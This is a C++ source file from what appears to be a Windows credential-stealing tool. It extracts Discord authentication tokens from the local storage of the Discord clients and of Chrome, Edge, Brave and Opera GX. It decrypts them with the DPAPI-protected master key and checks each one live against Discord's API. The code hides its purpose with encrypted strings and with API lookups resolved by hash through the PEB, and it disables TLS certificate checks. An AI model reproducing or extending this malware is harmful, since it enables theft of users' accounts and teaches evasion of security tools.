#define NOMINMAX
#include <windows.h>
#include <filesystem>
#include <fstream>
#include <regex>
#include <algorithm>
#include <unordered_set>
#include <functional>

#include "discord_token_extractor.h"
#include "str_encrypt.h"
#include "peb_resolve.h"
#include "syscalls/syscall_resolver.h"
#include "dpapi.h"
#include "aes_gcm.h"
#include <curl/curl.h>
#include <nlohmann/json.hpp>

namespace fs = std::filesystem;
using namespace ChromeExtractor::Syscalls;

// ── Discord API validation ────────────────────────────────────────────────────

static size_t CurlWrite(void* data, size_t sz, size_t n, std::string* out) {
    out->append((char*)data, sz * n);
    return sz * n;
}

static std::string ValidateDiscordToken(const std::string& token) {
    CURL* curl = curl_easy_init();
    if (!curl) return "";

    std::string response;
    std::string authHdr = XSTR("Authorization: ") + token;
    struct curl_slist* hdrs = nullptr;
    hdrs = curl_slist_append(hdrs, authHdr.c_str());

    std::string apiUrl = XSTR("https://discord.com/api/v9/users/@me");
    curl_easy_setopt(curl, CURLOPT_URL,            apiUrl.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER,     hdrs);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,  CurlWrite);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA,      &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT,        8L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    CURLcode res  = curl_easy_perform(curl);
    long     code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || code != 200) return "";
    try {
        auto j = nlohmann::json::parse(response);
        if (j.contains("id")) return j["id"].get<std::string>();
    } catch (...) {}
    return "";
}

static std::string GetEnvStr(const char* var) {
    using FnGEVA = DWORD(WINAPI*)(LPCSTR, LPSTR, DWORD);
    constexpr DWORD kKB   = PebHash("kernelbase.dll");
    constexpr DWORD kGEVA = PebHash("GetEnvironmentVariableA");
    void* hm = PebGetModule(kKB);
    if (!hm) return "";
    auto fn = reinterpret_cast<FnGEVA>(PebGetExport(hm, kGEVA));
    if (!fn) return "";
    char buf[MAX_PATH] = {};
    DWORD n = fn(var, buf, MAX_PATH);
    return (n > 0 && n < MAX_PATH) ? std::string(buf, n) : "";
}

static std::vector<uint8_t> GetDiscordMasterKey(const std::string& localStatePath) {
    try {
        std::ifstream f(localStatePath);
        if (!f) return {};
        std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

        auto pos = content.find("\"encrypted_key\"");
        if (pos == std::string::npos) return {};
        pos = content.find(':', pos);
        if (pos == std::string::npos) return {};
        pos = content.find('"', pos);
        if (pos == std::string::npos) return {};
        ++pos;
        auto end = content.find('"', pos);
        if (end == std::string::npos) return {};

        auto encKey = DPAPI::Base64Decode(content.substr(pos, end - pos));
        if (encKey.size() <= 5) return {};

        std::vector<uint8_t> raw(encKey.begin() + 5, encKey.end());
        return DPAPI::Decrypt(raw);
    } catch (...) { return {}; }
}

static std::string AESDecryptToken(const std::vector<uint8_t>& buf,
                                   const std::vector<uint8_t>& key) {
    if (buf.size() < 31) return "";
    std::vector<uint8_t> data(buf.begin() + 3, buf.end());
    return AesGcm::DecryptToString(key, data);
}

static std::string Base64Enc(const std::string& str) {
    std::vector<uint8_t> v(str.begin(), str.end());
    return DPAPI::Base64Encode(v);
}

// Copy a potentially locked file to temp with shared-read access
// Returns empty string on failure; caller must DeleteFileW when done
static std::wstring CopyLockedFileToTemp(const std::wstring& srcPath) {
    using FnGTPW = DWORD(WINAPI*)(DWORD, LPWSTR);
    using FnCFW  = HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    using FnRF   = BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    using FnWF   = BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    using FnCH   = BOOL(WINAPI*)(HANDLE);
    using FnDFW  = BOOL(WINAPI*)(LPCWSTR);
    constexpr DWORD kKB   = PebHash("kernelbase.dll");
    constexpr DWORD kGTPW = PebHash("GetTempPathW");
    constexpr DWORD kCFW  = PebHash("CreateFileW");
    constexpr DWORD kRF   = PebHash("ReadFile");
    constexpr DWORD kWF   = PebHash("WriteFile");
    constexpr DWORD kCH   = PebHash("CloseHandle");
    constexpr DWORD kDFW  = PebHash("DeleteFileW");
    void* hkb = PebGetModule(kKB);
    if (!hkb) return {};
    auto pGTPW = reinterpret_cast<FnGTPW>(PebGetExport(hkb, kGTPW));
    auto pCFW  = reinterpret_cast<FnCFW> (PebGetExport(hkb, kCFW));
    auto pRF   = reinterpret_cast<FnRF>  (PebGetExport(hkb, kRF));
    auto pWF   = reinterpret_cast<FnWF>  (PebGetExport(hkb, kWF));
    auto pCH   = reinterpret_cast<FnCH>  (PebGetExport(hkb, kCH));
    auto pDFW  = reinterpret_cast<FnDFW> (PebGetExport(hkb, kDFW));
    if (!pGTPW || !pCFW || !pRF || !pWF || !pCH) return {};

    wchar_t tmpBuf[MAX_PATH];
    DWORD len = pGTPW(MAX_PATH, tmpBuf);
    if (len == 0 || len >= MAX_PATH) return {};

    std::wstring dstPath = std::wstring(tmpBuf, len) +
        L"cex_lvldb_" + std::to_wstring(std::hash<std::wstring>{}(srcPath)) + L".tmp";

    HANDLE hSrc = pCFW(srcPath.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hSrc == INVALID_HANDLE_VALUE) return {};

    HANDLE hDst = pCFW(dstPath.c_str(), GENERIC_WRITE, 0,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, nullptr);
    if (hDst == INVALID_HANDLE_VALUE) {
        pCH(hSrc);
        return {};
    }

    char buf[65536];
    DWORD bytesRead = 0, bytesWritten = 0;
    bool ok = true;
    while (pRF(hSrc, buf, sizeof(buf), &bytesRead, nullptr) && bytesRead > 0) {
        if (!pWF(hDst, buf, bytesRead, &bytesWritten, nullptr) || bytesWritten != bytesRead) {
            ok = false;
            break;
        }
    }

    pCH(hSrc);
    pCH(hDst);

    if (!ok) {
        if (pDFW) pDFW(dstPath.c_str());
        return {};
    }
    return dstPath;
}

static void ScanLevelDB(const std::string& path, const std::string& source,
                        const std::vector<uint8_t>& masterKey,
                        std::vector<DiscordTokenEntry>& out,
                        std::unordered_set<std::string>& seen) {
    using FnDFW = BOOL(WINAPI*)(LPCWSTR);
    constexpr DWORD kKB  = PebHash("kernelbase.dll");
    constexpr DWORD kDFW = PebHash("DeleteFileW");
    void* hkb = PebGetModule(kKB);
    auto pDFW = hkb ? reinterpret_cast<FnDFW>(PebGetExport(hkb, kDFW)) : nullptr;
    const std::regex tokenRe("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}|mfa\\.[\\w-]{84}");
    const std::regex encRe("dQw4w9WgXcQ:[^\"'\\s]+");
    const std::regex idRe("\"id\"\\s*:\\s*\"?(\\d{17,19})\"?");

    std::error_code ec;
    for (auto& file : fs::directory_iterator(path, ec)) {
        if (!file.is_regular_file()) continue;
        std::string ext = file.path().extension().string();
        if (ext != ".log" && ext != ".ldb") continue;

        // Copy locked LevelDB file to temp so we can read without exclusive lock
        std::wstring tmpPath = CopyLockedFileToTemp(file.path().wstring());
        if (tmpPath.empty()) continue;

        try {
            std::ifstream f(tmpPath, std::ios::binary);
            if (!f) {
                if (pDFW) pDFW(tmpPath.c_str());
                continue;
            }

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            f.close();
            std::replace(content.begin(), content.end(), '\0', ' ');

            // Encrypted Discord tokens
            if (!masterKey.empty()) {
                std::sregex_iterator encIt(content.begin(), content.end(), encRe);
                std::sregex_iterator encEnd;

                std::vector<std::string> ids;
                std::sregex_iterator idIt(content.begin(), content.end(), idRe);
                for (; idIt != std::sregex_iterator{}; ++idIt)
                    ids.push_back((*idIt)[1]);
                std::sort(ids.begin(), ids.end());
                ids.erase(std::unique(ids.begin(), ids.end()), ids.end());

                for (; encIt != encEnd; ++encIt) {
                    std::string matched = (*encIt)[0];
                    auto encBytes = DPAPI::Base64Decode(matched.substr(matched.find(':') + 1));
                    std::string dec = AESDecryptToken(encBytes, masterKey);
                    if (dec.empty()) continue;

                    ptrdiff_t dots = std::count(dec.begin(), dec.end(), '.');
                    if (dots == 1) {
                        for (const auto& uid : ids) {
                            std::string b = Base64Enc(uid);
                            while (!b.empty() && b.back() == '=') b.pop_back();
                            while (!b.empty() && (b.back() == '\n' || b.back() == '\r')) b.pop_back();
                            std::string tok = b + "." + dec;
                            if (seen.insert(tok).second) out.push_back({source, tok});
                        }
                    } else {
                        if (seen.insert(dec).second) out.push_back({source, dec});
                    }
                }
            }

            // Plain-text tokens
            std::sregex_iterator it(content.begin(), content.end(), tokenRe);
            for (; it != std::sregex_iterator{}; ++it) {
                std::string tok = (*it)[0];
                if (seen.insert(tok).second) out.push_back({source, tok});
            }
        } catch (...) {}

        // Always clean up temp copy
        if (pDFW) pDFW(tmpPath.c_str());
    }
}

std::vector<DiscordTokenEntry> DiscordTokenExtractor::Extract() {
    std::vector<DiscordTokenEntry> results;
    std::unordered_set<std::string> seen;

    const std::string app   = GetEnvStr("APPDATA");
    const std::string local = GetEnvStr("LOCALAPPDATA");

    struct Entry { std::string name; std::string lvldb; bool discord; std::string ls; };
    const std::vector<Entry> entries = {
        {"Discord",        app   + XSTR("\\discord\\Local Storage\\leveldb"),
                           true, app   + XSTR("\\discord\\Local State")},
        {"Discord Canary", app   + XSTR("\\discordcanary\\Local Storage\\leveldb"),
                           true, app   + XSTR("\\discordcanary\\Local State")},
        {"Discord PTB",    app   + XSTR("\\discordptb\\Local Storage\\leveldb"),
                           true, app   + XSTR("\\discordptb\\Local State")},
        {"Chrome",         local + XSTR("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
                           false, ""},
        {"Edge",           local + XSTR("\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"),
                           false, ""},
        {"Brave",          local + XSTR("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"),
                           false, ""},
        {"Opera GX",       app   + XSTR("\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb"),
                           false, ""},
    };

    for (const auto& e : entries) {
        if (!fs::exists(e.lvldb)) continue;
        std::vector<uint8_t> masterKey;
        if (e.discord) masterKey = GetDiscordMasterKey(e.ls);
        ScanLevelDB(e.lvldb, e.name, masterKey, results, seen);
    }

    std::vector<DiscordTokenEntry> validated;
    std::unordered_set<std::string> seen_ids;

    for (const auto& entry : results) {
        std::string uid = ValidateDiscordToken(entry.token);
        if (!uid.empty() && seen_ids.insert(uid).second)
            validated.push_back(entry);
    }

    return validated;
}